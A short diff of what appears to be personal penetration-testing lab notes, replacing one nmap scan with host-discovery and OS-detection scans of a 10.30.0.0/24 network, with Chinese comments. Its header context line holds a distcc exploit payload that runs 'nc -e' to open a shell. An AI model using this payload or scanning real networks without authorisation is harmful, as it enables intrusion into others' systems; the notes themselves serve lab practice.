@@ -85,6 +85,10 @@ printf "DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV00000031nc -e /b
 
 25/05/2026
 
-sudo nmap -Pn -sT -T2 —max-retries 1 -top-ports 1024 10.30.0.102-109 etc
+sudo nmap -sP 10.30.0.0/24 -oG - | grep -i "Up"
+# 这个命令列出所有当前网络的alive hosts
+
+nmap -sT -O 10.30.0.0/24
+# 这个命令列出所有当前网络的alive host， opened ports and OS info
 
 
